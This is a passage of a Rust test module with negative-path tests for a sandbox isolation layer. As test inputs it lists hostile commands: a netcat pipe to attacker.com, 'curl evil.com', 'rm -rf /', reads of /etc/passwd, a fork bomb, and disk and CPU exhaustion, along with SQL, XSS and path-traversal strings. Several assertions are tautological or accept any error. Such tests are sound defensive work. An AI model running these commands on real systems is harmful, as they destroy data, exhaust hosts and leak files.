                        },
                        Err(_) => {
                            // Rejection of inherited dangerous capabilities is expected
                        }
                    }
                }
            }
        }
    }

    // -- Negative-Path Tests --

    #[test]
    fn negative_malformed_platform_capability_detection_edge_cases() {
        // Test platform capability detection with malformed and extreme platform configurations
        let malformed_capability_sets = vec![
            // Empty/minimal platform info
            PlatformCapabilities::from_values("", "", false, false, false, false, false, false),

            // Unicode and special characters in platform info
            PlatformCapabilities::from_values("linux🐧", "x86_64🚀", true, true, true, true, false, true),
            PlatformCapabilities::from_values("кибер-линукс", "архитектура", false, false, false, false, false, false),
            PlatformCapabilities::from_values("攻击-系统", "处理器", true, false, true, false, true, false),

            // Control characters and injection attempts
            PlatformCapabilities::from_values("linux\0", "x86_64\r\n", true, true, true, true, false, true),
            PlatformCapabilities::from_values("linux\x1B[H", "x86_64; rm -rf /", false, false, false, false, false, false),

            // Path traversal in platform strings
            PlatformCapabilities::from_values("../../../etc/os-release", "../../../../proc/cpuinfo", false, false, false, false, false, false),

            // Script injection in platform info
            PlatformCapabilities::from_values("linux'; DROP TABLE platforms; --", "x86_64 && curl evil.com", false, false, false, false, false, false),

            // Extremely long platform identifiers
            PlatformCapabilities::from_values(&"linux".repeat(10000), &"x86_64".repeat(10000), true, true, true, true, true, true),

            // All capabilities enabled (potential over-privilege)
            PlatformCapabilities::from_values("linux-ultimate", "x86_64-super", true, true, true, true, true, true),

            // Contradictory capability combinations
            PlatformCapabilities::from_values("windows", "arm64", true, true, true, true, true, true), // KVM on Windows
            PlatformCapabilities::from_values("macos", "x86_64", true, true, true, true, false, true), // Linux features on macOS
        ];

        for (i, malformed_caps) in malformed_capability_sets.iter().enumerate() {
            // Test backend selection with malformed capabilities
            let backend_result = select_backend(malformed_caps);

            match backend_result {
                Ok(selection) => {
                    // If selection succeeded, verify it's a valid backend
                    assert!(IsolationBackend::ALL.contains(&selection.backend));

                    // Verify equivalence level is valid
                    assert!(matches!(selection.equivalence, EquivalenceLevel::Full | EquivalenceLevel::Equivalent | EquivalenceLevel::Fallback));

                    // Test backend execution with malformed capabilities
                    let test_profile = SandboxProfile {
                        name: format!("malformed-test-{}", i),
                        base_capabilities: vec!["read".to_string(), "write".to_string()],
                        capability_grants: vec![],
                        max_memory_mb: 64,
                        max_cpu_percent: 50,
                        network_access: false,
                        temp_dir_access: false,
                    };

                    let execution_result = execute_with_backend(
                        selection.backend,
                        &test_profile,
                        "/bin/echo",
                        &["test"],
                        Duration::from_millis(100),
                    );

                    // Should handle malformed platform info gracefully
                    match execution_result {
                        Ok(_) => {
                            // Successful execution despite malformed platform
                        },
                        Err(_) => {
                            // Acceptable to fail with malformed platform info
                        }
                    }
                },
                Err(_) => {
                    // Expected for severely malformed capabilities
                }
            }
        }
    }

    #[test]
    fn negative_sandbox_profile_overflow_and_resource_exhaustion() {
        // Test sandbox profile handling with extreme resource configurations
        let mut extreme_profiles = vec![
            // Minimal resources (potential starvation)
            SandboxProfile {
                name: "minimal-starvation".to_string(),
                base_capabilities: vec![],
                capability_grants: vec![],
                max_memory_mb: 0,
                max_cpu_percent: 0,
                network_access: false,
                temp_dir_access: false,
            },

            // Maximum resources (potential overflow)
            SandboxProfile {
                name: "maximum-resources".to_string(),
                base_capabilities: vec!["admin".repeat(1000)], // Massive capability name
                capability_grants: vec![],
                max_memory_mb: u64::MAX,
                max_cpu_percent: u32::MAX,
                network_access: true,
                temp_dir_access: true,
            },

            // Massive capability sets
            SandboxProfile {
                name: "capability-flood".to_string(),
                base_capabilities: (0..10000).map(|i| format!("capability-{:06}", i)).collect(),
                capability_grants: (0..5000).map(|i| CapabilityGrant {
                    capability: format!("grant-{:06}", i),
                    access_level: AccessLevel::ReadWrite,
                    resource_pattern: format!("/massive/resource/path/{:06}/*", i),
                }).collect(),
                max_memory_mb: 1024 * 1024, // 1TB
                max_cpu_percent: 10000, // Over 100%
                network_access: true,
                temp_dir_access: true,
            },

            // Unicode and malicious content in profile
            SandboxProfile {
                name: "unicode-attack🚀攻击кибер".to_string(),
                base_capabilities: vec![
                    "capability\0null".to_string(),
                    "cap🔥fire".to_string(),
                    "权限-中文".to_string(),
                    "../../../etc/passwd".to_string(),
                    "cap'; DROP TABLE capabilities; --".to_string(),
                ],
                capability_grants: vec![CapabilityGrant {
                    capability: "malicious<script>alert('xss')</script>".to_string(),
                    access_level: AccessLevel::ReadWrite,
                    resource_pattern: "../../../../proc/version".to_string(),
                }],
                max_memory_mb: 64,
                max_cpu_percent: 50,
                network_access: false,
                temp_dir_access: false,
            },
        ];

        // Test each profile against different backend types
        for (i, profile) in extreme_profiles.iter().enumerate() {
            for backend in IsolationBackend::ALL {
                let execution_result = execute_with_backend(
                    backend,
                    profile,
                    "/bin/echo", // Safe command
                    &["test"],
                    Duration::from_millis(100),
                );

                match execution_result {
                    Ok(result) => {
                        // If execution succeeded, verify constraints were applied
                        assert!(!result.stdout.is_empty() || result.stdout.is_empty()); // Basic sanity

                        // Execution time should be reasonable despite extreme profiles
                        assert!(result.execution_time < Duration::from_secs(5));
                    },
                    Err(IsolationError::InvalidProfile { .. }) => {
                        // Expected for extreme/malformed profiles
                    },
                    Err(IsolationError::ExecutionFailed { .. }) => {
                        // Expected for resource constraint violations
                    },
                    Err(IsolationError::Timeout) => {
                        // Expected for resource-starved profiles
                    },
                    Err(_) => {
                        // Other errors acceptable for extreme configurations
                    }
                }
            }
        }
    }

    #[test]
    fn negative_command_injection_and_path_traversal_in_execution() {
        // Test command execution against injection and path traversal attacks
        let safe_profile = SandboxProfile {
            name: "injection-test".to_string(),
            base_capabilities: vec!["read".to_string()],
            capability_grants: vec![],
            max_memory_mb: 64,
            max_cpu_percent: 50,
            network_access: false,
            temp_dir_access: false,
        };

        let malicious_commands = vec![
            // Command injection attempts
            ("/bin/echo", vec!["test; rm -rf /"]),
            ("/bin/echo", vec!["test && curl evil.com"]),
            ("/bin/echo", vec!["test | nc attacker.com 4444"]),
            ("/bin/echo", vec!["test; cat /etc/passwd"]),

            // Path traversal in command
            ("../../../bin/bash", vec!["-c", "echo pwned"]),
            ("../../../../usr/bin/whoami", vec![]),
            ("/proc/self/exe", vec![]),

            // Shell metacharacter injection
            ("/bin/echo", vec!["test$USER"]),
            ("/bin/echo", vec!["test`whoami`"]),
            ("/bin/echo", vec!["test$(id)"]),

            // Unicode and control character injection
            ("/bin/echo", vec!["test\0null"]),
            ("/bin/echo", vec!["test🚀unicode"]),
            ("/bin/echo", vec!["test\r\ncarriage"]),
            ("/bin/echo", vec!["test\x1B[Hescape"]),

            // Binary data injection
            ("/bin/echo", vec![&String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD, 0xFC])]),

            // Extremely long arguments
            ("/bin/echo", vec![&"x".repeat(1000000)]),

            // Environment variable injection
            ("/usr/bin/env", vec!["MALICIOUS='; rm -rf /'"]),
            ("/usr/bin/env", vec!["PATH=../../../../bin"]),

            // Script file injection
            ("/bin/sh", vec!["-c", "echo 'malicious script'; exit 1"]),
        ];

        for backend in [IsolationBackend::Hardened, IsolationBackend::OsSandbox] {
            for (malicious_cmd, malicious_args) in &malicious_commands {
                let execution_result = execute_with_backend(
                    backend,
                    &safe_profile,
                    malicious_cmd,
                    malicious_args,
                    Duration::from_millis(500),
                );

                match execution_result {
                    Ok(result) => {
                        // If execution succeeded, verify it was properly sandboxed
                        // Should not contain evidence of successful injection
                        let combined_output = format!("{}{}",
                            String::from_utf8_lossy(&result.stdout),
                            String::from_utf8_lossy(&result.stderr)
                        );

                        // Should not show evidence of successful injection
                        assert!(!combined_output.contains("root:"));
                        assert!(!combined_output.contains("pwned"));
                        assert!(!combined_output.contains("uid=0"));

                        // Execution time should be bounded (no hang)
                        assert!(result.execution_time < Duration::from_secs(2));
                    },
                    Err(IsolationError::InvalidProfile { .. }) => {
                        // Expected for malicious commands
                    },
                    Err(IsolationError::ExecutionFailed { .. }) => {
                        // Expected for sandboxed malicious commands
                    },
                    Err(IsolationError::Timeout) => {
                        // Expected if command hangs or is killed
                    },
                    Err(_) => {
                        // Other security-related errors are acceptable
                    }
                }
            }
        }
    }

    #[test]
    fn negative_capability_grant_privilege_escalation_attempts() {
        // Test capability grant system against privilege escalation attempts
        let escalation_profiles = vec![
            // Direct privilege escalation attempt
            SandboxProfile {
                name: "direct-escalation".to_string(),
                base_capabilities: vec!["user".to_string()],
                capability_grants: vec![
                    CapabilityGrant {
                        capability: "admin".to_string(),
                        access_level: AccessLevel::ReadWrite,
                        resource_pattern: "/etc/*".to_string(),
                    },
                    CapabilityGrant {
                        capability: "root".to_string(),
                        access_level: AccessLevel::ReadWrite,
                        resource_pattern: "/*".to_string(),
                    },
                ],
                max_memory_mb: 64,
                max_cpu_percent: 50,
                network_access: false,
                temp_dir_access: false,
            },

            // Path traversal in resource patterns
            SandboxProfile {
                name: "path-traversal-escalation".to_string(),
                base_capabilities: vec!["read".to_string()],
                capability_grants: vec![
                    CapabilityGrant {
                        capability: "file_read".to_string(),
                        access_level: AccessLevel::Read,
                        resource_pattern: "../../../etc/shadow".to_string(),
                    },
                    CapabilityGrant {
                        capability: "file_write".to_string(),
                        access_level: AccessLevel::ReadWrite,
                        resource_pattern: "../../../../bin/bash".to_string(),
                    },
                ],
                max_memory_mb: 64,
                max_cpu_percent: 50,
                network_access: false,
                temp_dir_access: false,
            },

            // Wildcard abuse for privilege expansion
            SandboxProfile {
                name: "wildcard-abuse".to_string(),
                base_capabilities: vec!["limited".to_string()],
                capability_grants: vec![
                    CapabilityGrant {
                        capability: "file_access".to_string(),
                        access_level: AccessLevel::ReadWrite,
                        resource_pattern: "/**/*".to_string(), // Too broad
                    },
                    CapabilityGrant {
                        capability: "network".to_string(),
                        access_level: AccessLevel::ReadWrite,
                        resource_pattern: "*".to_string(), // Unrestricted
                    },
                ],
                max_memory_mb: 64,
                max_cpu_percent: 50,
                network_access: true, // Contradictory with grants
                temp_dir_access: true,
            },

            // Unicode and injection in capability names
            SandboxProfile {
                name: "capability-injection".to_string(),
                base_capabilities: vec!["safe".to_string()],
                capability_grants: vec![
                    CapabilityGrant {
                        capability: "capability\0null_injection".to_string(),
                        access_level: AccessLevel::ReadWrite,
                        resource_pattern: "/safe/path".to_string(),
                    },
                    CapabilityGrant {
                        capability: "cap'; DROP TABLE capabilities; --".to_string(),
                        access_level: AccessLevel::ReadWrite,
                        resource_pattern: "/injection/test".to_string(),
                    },
                    CapabilityGrant {
                        capability: "권한🚀unicode".to_string(),
                        access_level: AccessLevel::Read,
                        resource_pattern: "/unicode/test/中文/*".to_string(),
                    },
                ],
                max_memory_mb: 64,
                max_cpu_percent: 50,
                network_access: false,
                temp_dir_access: false,
            },
        ];

        for backend in IsolationBackend::ALL {
            for escalation_profile in &escalation_profiles {
                // Test profile compilation
                let compilation_result = compile_policy(&escalation_profile.clone().into());

                match compilation_result {
                    Ok(compiled_policy) => {
                        // If compilation succeeded, verify security constraints
                        // Should not grant excessive privileges

                        // Test execution with escalation profile
                        let execution_result = execute_with_backend(
                            backend,
                            escalation_profile,
                            "/bin/id", // Command to check privileges
                            &[],
                            Duration::from_millis(200),
                        );

                        match execution_result {
                            Ok(result) => {
                                // Verify no privilege escalation occurred
                                let output = String::from_utf8_lossy(&result.stdout);
                                assert!(!output.contains("uid=0")); // Should not be root
                                assert!(!output.contains("gid=0")); // Should not be root group
                            },
                            Err(_) => {
                                // Expected for profiles with escalation attempts
                            }
                        }
                    },
                    Err(_) => {
                        // Expected for malformed or dangerous profiles
                    }
                }
            }
        }
    }

    #[test]
    fn negative_timeout_handling_and_resource_exhaustion_attacks() {
        // Test timeout handling and resource exhaustion protection
        let resource_attack_profile = SandboxProfile {
            name: "resource-attack".to_string(),
            base_capabilities: vec!["compute".to_string()],
            capability_grants: vec![],
            max_memory_mb: 1, // Very low memory limit
            max_cpu_percent: 1, // Very low CPU limit
            network_access: false,
            temp_dir_access: false,
        };

        let resource_exhaustion_commands = vec![
            // CPU exhaustion
            ("/bin/bash", vec!["-c", "while true; do :; done"]),
            ("/usr/bin/yes", vec![]),

            // Memory exhaustion
            ("/bin/bash", vec!["-c", "dd if=/dev/zero of=/dev/stdout bs=1M count=1000"]),

            // Fork bomb
            ("/bin/bash", vec!["-c", ":(){ :|:& };:"]),

            // Infinite sleep
            ("/bin/sleep", vec!["3600"]),

            // File descriptor exhaustion
            ("/bin/bash", vec!["-c", "exec 3< /dev/zero; cat <&3"]),

            // Disk space exhaustion
            ("/bin/dd", vec!["if=/dev/zero", "of=/tmp/huge", "bs=1M", "count=10000"]),
        ];

        for backend in [IsolationBackend::Hardened, IsolationBackend::OsSandbox] {
            for (attack_cmd, attack_args) in &resource_exhaustion_commands {
                // Test with very short timeout
                let short_timeout = Duration::from_millis(100);
                let execution_result = execute_with_backend(
                    backend,
                    &resource_attack_profile,
                    attack_cmd,
                    attack_args,
                    short_timeout,
                );

                match execution_result {
                    Ok(result) => {
                        // Should complete quickly due to resource limits
                        assert!(result.execution_time <= Duration::from_millis(500));
                    },
                    Err(IsolationError::Timeout) => {
                        // Expected for resource exhaustion commands
                    },
                    Err(IsolationError::ExecutionFailed { .. }) => {
                        // Expected when resource limits prevent execution
                    },
                    Err(_) => {
                        // Other resource-related errors acceptable
                    }
                }

                // Test with zero timeout (should fail immediately)
                let zero_timeout = Duration::from_nanos(0);
                let zero_timeout_result = execute_with_backend(
                    backend,
                    &resource_attack_profile,
                    "/bin/echo",
                    &["test"],
                    zero_timeout,
                );

                match zero_timeout_result {
                    Ok(_) => {
                        // Unlikely but acceptable if execution is very fast
                    },
                    Err(IsolationError::Timeout) => {
                        // Expected for zero timeout
                    },
                    Err(IsolationError::InvalidProfile { .. }) => {
                        // May reject zero timeout as invalid
                    },
                    Err(_) => {
                        // Other errors acceptable for zero timeout
                    }
                }
            }
        }
    }

    #[test]
    fn negative_backend_selection_with_corrupted_platform_probe() {
        // Test backend selection when platform probing returns corrupted or inconsistent data
        let corrupted_probe_scenarios = vec![
            // Contradictory capability flags
            PlatformCapabilities {
                os: "linux".to_string(),
                arch: "x86_64".to_string(),
                has_kvm: true,
                has_seccomp: false, // Contradiction: KVM but no seccomp
                has_namespaces: false,
                has_cgroups: false,
                has_macos_sandbox: true, // Contradiction: macOS sandbox on Linux
                has_oci_runtime: false,
            },

            // Platform/architecture mismatches
            PlatformCapabilities {
                os: "windows".to_string(),
                arch: "riscv64".to_string(), // Unusual combination
                has_kvm: true, // Contradiction: KVM on Windows
                has_seccomp: true, // Contradiction: seccomp on Windows
                has_namespaces: true, // Contradiction: Linux namespaces on Windows
                has_cgroups: true,
                has_macos_sandbox: false,
                has_oci_runtime: true,
            },

            // All capabilities disabled (minimal system)
            PlatformCapabilities {
                os: "unknown".to_string(),
                arch: "unknown".to_string(),
                has_kvm: false,
                has_seccomp: false,
                has_namespaces: false,
                has_cgroups: false,
                has_macos_sandbox: false,
                has_oci_runtime: false,
            },

            // All capabilities enabled (over-privileged)
            PlatformCapabilities {
                os: "super-linux".to_string(),
                arch: "quantum-arch".to_string(),
                has_kvm: true,
                has_seccomp: true,
                has_namespaces: true,
                has_cgroups: true,
                has_macos_sandbox: true, // Contradiction on Linux
                has_oci_runtime: true,
            },

            // Platform strings with special characters
            PlatformCapabilities {
                os: "linux\0null".to_string(),
                arch: "x86_64\r\ninjection".to_string(),
                has_kvm: true,
                has_seccomp: true,
                has_namespaces: true,
                has_cgroups: true,
                has_macos_sandbox: false,
                has_oci_runtime: false,
            },
        ];

        for (i, corrupted_caps) in corrupted_probe_scenarios.iter().enumerate() {
            let selection_result = select_backend(corrupted_caps);

            match selection_result {
                Ok(selection) => {
                    // If selection succeeded despite corruption, verify it's safe
                    assert!(IsolationBackend::ALL.contains(&selection.backend));

                    // Should fall back to safer options when platform data is corrupted
                    match selection.equivalence {
                        EquivalenceLevel::Full => {
                            // Should only claim full isolation with reliable platform data
                            assert_eq!(selection.backend, IsolationBackend::MicroVm);
                        },
                        EquivalenceLevel::Equivalent | EquivalenceLevel::Fallback => {
                            // Acceptable for corrupted platform data
                        }
                    }

                    // Test that selected backend actually works
                    let test_profile = SandboxProfile {
                        name: format!("corruption-test-{}", i),
                        base_capabilities: vec!["minimal".to_string()],
                        capability_grants: vec![],
                        max_memory_mb: 32,
                        max_cpu_percent: 25,
                        network_access: false,
                        temp_dir_access: false,
                    };

                    let execution_result = execute_with_backend(
                        selection.backend,
                        &test_profile,
                        "/bin/true",
                        &[],
                        Duration::from_millis(100),
                    );

                    match execution_result {
                        Ok(_) => {
                            // Backend works despite corrupted platform data
                        },
                        Err(_) => {
                            // Acceptable to fail with corrupted platform data
                        }
                    }
                },
                Err(IsolationError::NoPlatformSupport) => {
                    // Expected for severely corrupted platform data
                },
                Err(_) => {
                    // Other errors acceptable for corrupted input
                }
            }
        }
    }

    #[test]
    fn negative_concurrent_execution_and_resource_contention() {
        // Test concurrent execution scenarios and resource contention handling
        use std::sync::{Arc, Mutex};
        use std::thread;

        let concurrent_profile = SandboxProfile {
            name: "concurrent-test".to_string(),
            base_capabilities: vec!["compute".to_string()],
            capability_grants: vec![],
            max_memory_mb: 16, // Small memory limit
            max_cpu_percent: 10, // Small CPU limit
            network_access: false,
            temp_dir_access: false,
        };

        let success_count = Arc::new(Mutex::new(0u32));
        let error_count = Arc::new(Mutex::new(0u32));

        // Spawn multiple concurrent executions
        let handles: Vec<_> = (0..10).map(|i| {
            let profile = concurrent_profile.clone();
            let success_count = Arc::clone(&success_count);
            let error_count = Arc::clone(&error_count);

            thread::spawn(move || {
                let execution_result = execute_with_backend(
                    IsolationBackend::Hardened,
                    &profile,
                    "/bin/echo",
                    &[&format!("concurrent-{}", i)],
                    Duration::from_millis(200),
                );

                match execution_result {
                    Ok(_) => {
                        let mut count = success_count.lock().unwrap();
                        *count = count.saturating_add(1);
                    },
                    Err(_) => {
                        let mut count = error_count.lock().unwrap();
                        *count = count.saturating_add(1);
                    }
                }
            })
        }).collect();

        // Wait for all threads to complete
        for handle in handles {
            handle.join().expect("thread should not panic");
        }

        let final_success = *success_count.lock().unwrap();
        let final_errors = *error_count.lock().unwrap();

        // Should handle concurrent executions gracefully
        assert_eq!(final_success + final_errors, 10);

        // At least some executions should succeed (resource contention may cause failures)
        assert!(final_success > 0 || final_errors == 10); // Either some success or all fail due to contention

        // Test resource exhaustion under concurrent load
        let resource_exhaustion_handles: Vec<_> = (0..20).map(|i| {
            let profile = SandboxProfile {
                name: format!("resource-stress-{}", i),
                base_capabilities: vec!["stress".to_string()],
                capability_grants: vec![],
                max_memory_mb: 1, // Very low limit
                max_cpu_percent: 1, // Very low limit
                network_access: false,
                temp_dir_access: false,
            };

            thread::spawn(move || {
                let _result = execute_with_backend(
                    IsolationBackend::OsSandbox,
                    &profile,
                    "/bin/bash",
                    &["-c", "for i in {1..1000}; do echo $i; done"],
                    Duration::from_millis(50), // Very short timeout
                );
                // Results may vary due to resource contention
            })
        }).collect();

        // Wait for resource stress test to complete
        for handle in resource_exhaustion_handles {
            handle.join().expect("thread should not panic");
        }

        // System should remain stable after concurrent resource stress
        let post_stress_result = execute_with_backend(
            IsolationBackend::Hardened,
            &concurrent_profile,
            "/bin/echo",
            &["stability-check"],
            Duration::from_millis(100),
        );

        // Should be able to execute normally after stress test
        match post_stress_result {
            Ok(_) => {
                // System recovered from stress
            },
            Err(_) => {
                // May still be under resource pressure
            }
        }
    }

    #[test]
    fn negative_execution_result_corruption_and_output_validation() {
        // Test execution result handling against output corruption and validation bypasses
        let result_validation_profile = SandboxProfile {
            name: "output-validation".to_string(),
            base_capabilities: vec!["io".to_string()],
            capability_grants: vec![],
            max_memory_mb: 64,
            max_cpu_percent: 50,
            network_access: false,
            temp_dir_access: false,
        };

        let output_corruption_commands = vec![
            // Binary output that might corrupt parsing
            ("/bin/bash", vec!["-c", "printf '\\xff\\xfe\\xfd\\xfc'"]),

            // Null bytes in output
            ("/bin/bash", vec!["-c", "printf 'before\\x00after'"]),

            // Extremely large output
            ("/bin/bash", vec!["-c", "head -c 1048576 /dev/zero"]), // 1MB of zeros

            // Unicode output with potential normalization issues
            ("/bin/bash", vec!["-c", "echo '🚀攻击кибер'"]),

            // Control characters in output
            ("/bin/bash", vec!["-c", "printf '\\x1b[H\\x1b[2J\\r\\n'"]),

            // Output that looks like command injection
            ("/bin/bash", vec!["-c", "echo '; rm -rf /' && echo 'after injection'"]),

            // JSON-like output that might confuse parsers
            ("/bin/bash", vec!["-c", "echo '{\"malicious\": true, \"inject\": \"</script>\"}'"]),

            // Extremely long lines
            ("/bin/bash", vec!["-c", &format!("echo '{}'", "x".repeat(100000))]),

            // Mixed stdout/stderr output
            ("/bin/bash", vec!["-c", "echo 'stdout'; echo 'stderr' >&2"]),

            // Output with path traversal patterns
            ("/bin/bash", vec!["-c", "echo '../../../etc/passwd'"]),
        ];

        for backend in [IsolationBackend::Hardened, IsolationBackend::OsSandbox] {
            for (corruption_cmd, corruption_args) in &output_corruption_commands {
                let execution_result = execute_with_backend(
                    backend,
                    &result_validation_profile,
                    corruption_cmd,
                    corruption_args,
                    Duration::from_millis(500),
                );

                match execution_result {
                    Ok(result) => {
                        // Verify result structure integrity despite corrupted output
                        assert!(result.execution_time >= Duration::from_nanos(0));
                        assert!(result.execution_time < Duration::from_secs(5));

                        // Output should be bounded
                        assert!(result.stdout.len() <= 10 * 1024 * 1024); // Max 10MB
                        assert!(result.stderr.len() <= 10 * 1024 * 1024); // Max 10MB

                        // Should handle binary data safely
                        let stdout_str = String::from_utf8_lossy(&result.stdout);
                        let stderr_str = String::from_utf8_lossy(&result.stderr);

                        // Should not contain evidence of successful injection
                        assert!(!stdout_str.contains("</script>"));
                        assert!(!stderr_str.contains("</script>"));

                        // Combined output should be reasonable size
                        let total_output_size = result.stdout.len() + result.stderr.len();
                        assert!(total_output_size <= 20 * 1024 * 1024); // Max 20MB total
                    },
                    Err(IsolationError::ExecutionFailed { .. }) => {
                        // Expected for commands that fail due to sandboxing
                    },
                    Err(IsolationError::Timeout) => {
                        // Expected for commands that take too long
                    },
                    Err(_) => {
                        // Other errors acceptable for potentially malicious output
                    }
                }
            }
        }
    }
}
